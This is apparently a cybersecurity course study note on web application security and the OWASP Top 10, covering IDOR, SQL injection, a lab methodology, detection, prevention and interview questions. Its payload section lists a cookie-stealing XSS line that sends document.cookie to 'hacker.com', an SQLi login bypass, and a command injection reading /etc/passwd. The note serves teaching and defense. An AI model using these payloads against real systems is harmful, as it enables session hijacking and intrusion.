# Web Application Security & OWASP Top 10

`[ APPLICATION ]` `[ SECURITY ]` `[ OWASP ]`

> **Course:** Cybersecurity
> **Date:** 2026-08-13 | **Session:** 03

---


## 1. What is it?
Web applications are software programs running on a web server accessed via a browser, typically consisting of a Frontend (Presentation), Backend (Logic), and Database (Data). An API acts as the messenger between different software components. Web application security focuses on protecting these components from threats, heavily guided by the **OWASP Top 10**—a standard awareness document outlining the most critical global security risks (e.g., Broken Access Control, Injection).

## 2. Why does it happen?
Web vulnerabilities arise from a combination of implementation flaws (e.g., failing to sanitize input before sending it to a database) and insecure design (architectural flaws, like lacking threat modeling). Human error (Security Misconfiguration), reliance on vulnerable third-party code (Outdated Components), and fundamental misunderstandings of identity (**Authentication**) versus permissions (**Authorization**) are the root causes of most breaches.

## 3. How does it work?
Modern web applications communicate over **HTTP** (a stateless protocol). 
- The client (browser) sends HTTP requests (GET, POST, etc.) with state-tracking tokens (**Cookies**) to the server.
- The server processes the request, executes backend logic, queries the database, and returns an HTTP response (with Status Codes like 200 OK or 401 Unauthorized).
Attackers intercept this flow to modify requests. For example, they may change a user ID in the request parameters or inject malicious scripts.

```text
+----------+      HTTP Request (Burp Suite Intercepts)     +-------------+       +----------+
| Browser  | --------------------------------------------> | Backend API | <---> | Database |
| Frontend | <-------------------------------------------- | (Logic)     |       | (Data)   |
+----------+      HTTP Response                            +-------------+       +----------+
```

## 4. Where is it used / found?
Web applications are everywhere, ranging from traditional thin clients (where the server renders HTML) to modern thick clients (Single Page Applications like React, where the browser does heavy lifting locally). Vulnerabilities manifest in APIs, URL parameters, input forms, outdated third-party libraries, and CI/CD pipelines.

## 5. How do I identify it?
- **Broken Access Control / IDOR:** Look for predictable URL parameters (e.g., `?id=1005`) that load user-specific data.
- **Injection:** Look for input fields or URL parameters that throw raw database stack traces when given special characters like `'` or `"`.
- **Security Misconfiguration:** Look for default credentials (`admin/admin`), verbose error pages, or open directory listings.
- **SSRF:** Look for features that fetch data from user-provided URLs (e.g., importing a profile picture from a link).

## 6. Hands-on / Lab Methodology

```text
🧪 HANDS-ON
━━━━━━━━━━━━━━━━━━━━
```
- **What to observe first:** Map the application's attack surface using an intercepting proxy like **Burp Suite**. Note the HTTP methods, parameters, and cookies.
- **Attack surface:** Login forms, API endpoints, URL parameters, headers, and file upload fields.
- **Initial hypothesis:** Assume the application implicitly trusts user input or fails to explicitly verify authorization on backend requests.
- **What to test:** 
  - Change user IDs in requests to test for IDOR.
  - Insert `' OR '1'='1` into login fields to test for SQLi.
- **How to test it safely (authorized lab):** Only test against authorized environments like local VMs or PortSwigger Web Security Academy.
- **Expected result:** The server might return unauthorized data, bypass a login prompt, or crash.
- **How to interpret the result:** If the server returns another user's private data, an IDOR exists. If a raw database error appears, it's vulnerable to SQLi.

## 7. Failed Attempts & Why
> ⚠️ **FAILED ATTEMPTS / LESSONS LEARNED**
> 
> - **What was tried:** Changing an ID parameter from `id=1005` to a random UUID to test for IDOR.
- **Why it failed:** UUIDs are mathematically unpredictable, making enumeration nearly impossible.
- **What that tells us:** While UUIDs stop easy guessing, they **do not prevent IDOR**. The underlying Broken Access Control remains if the server fails to verify ownership.
- **What to try next:** Find a leaked UUID elsewhere in the application and test if the server still grants access without checking authorization.


## 8. Example
**IDOR Example:** An attacker logs in and sees their receipt at `https://bank.com/receipt?id=1005`. They manually change the URL to `id=1006` and view another user's receipt because the backend didn't verify if the logged-in user actually owned receipt 1006.

**SQLi Example:** An attacker inputs `admin' OR '1'='1` in the username field. The database reads `OR '1'='1'` as a mathematically true statement, ignores the password check, and logs them in as the admin.

## 9. Impact
Attackers can achieve unauthorized access to sensitive data, full system takeover via Remote Code Execution (Command Injection / Insecure Deserialization), steal identities (Credential Stuffing), and compromise organizational integrity (Supply Chain Attacks).

## 10. Detection
- **Logging & Monitoring:** Implement centralized **SIEM** (Security Information and Event Management) tools to detect brute-force attacks, anomalous database queries, or missing local logs.
- **Defensive Tools:** Web Application Firewalls (WAF) can detect known malicious payloads like SQLi signatures.

## 11. Prevention / Remediation
- **Injection:** Exclusively use **Prepared Statements (Parameterized Queries)**.
- **Access Control:** Enforce **Least Privilege** and strictly verify authorization on every request. Never trust client-side input.
- **Authentication:** Enforce **Multi-Factor Authentication (MFA)** and rate limiting.
- **Cryptography:** Use TLS 1.2+ for data in transit. Use dedicated hashing algorithms (Argon2, bcrypt) for passwords at rest. Never store plain text.
- **System Hardening:** Remove unused services, change default passwords, and ensure the application **fails securely** (displays generic error messages instead of stack traces).
- **Supply Chain:** Maintain a Software Bill of Materials (SBOM) and use dependency scanners.

## 12. Related Concepts
- **Authentication (Identity) -> Authorization (Permissions) -> Broken Access Control.**
- **Encoding** (formatting data for safe transmission) vs. **Encryption** (hiding data reversibly with a key) vs. **Hashing** (creating a one-way irreversible fingerprint).

## 13. Important Commands / Syntax
- **SQLi Payload:** `' OR '1'='1` (Manipulates SQL logic to always evaluate to true).
- **XSS Payload:** `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>` (Steals a victim's session cookies).
- **Command Injection:** `127.0.0.1 && cat /etc/passwd` (Executes OS commands alongside expected input).

## 14. Interview Questions
- **Q: What is the difference between Authentication and Authorization?**
  **A:** Authentication proves *who* you are (e.g., logging in). Authorization dictates *what* you can do (e.g., admin vs. standard user permissions).
- **Q: What is the best defense against SQL Injection?**
  **A:** Prepared Statements (Parameterized Queries), which force the database to treat input strictly as data strings rather than executable code.
- **Q: How does IDOR work?**
  **A:** It occurs when an application provides direct access to objects based on user input without verifying if the user has permission to access that specific object.
- **Q: What is the difference between a 401 and 403 HTTP status code?**
  **A:** 401 means you are not authenticated (need to log in). 403 means you are authenticated but explicitly lack the authorization to view the resource.

## 16. Key Takeaways
> 💡 **KEY TAKEAWAYS**
> 
> - Always prioritize understanding the root cause (*why* an attack works) over memorizing payloads.
> - Modern web apps consist of a Frontend, Backend, and Database communicating via stateless HTTP.
> - The OWASP Top 10 is the gold standard for web app security risks.
> - Broken Access Control is the most critical risk; always verify permissions on the backend.
> - Cryptography requires proper transit encryption (TLS) and secure hashing for passwords (bcrypt/Argon2).
> - Security Misconfiguration and Vulnerable Components are low-effort, high-impact risks that require constant patching and system hardening.
> - When an application encounters an error, it must always fail closed (securely).
> 
>

Web applications rely on HTTP, APIs, and databases. The OWASP Top 10 defines the biggest threats, notably Broken Access Control (IDOR), Injection (SQLi/XSS), and Cryptographic Failures. Defend against these by enforcing strict server-side authorization checks, using Parameterized Queries for all database interactions, requiring MFA, hashing passwords properly, and employing system hardening with centralized logging. Always ensure applications "fail securely."
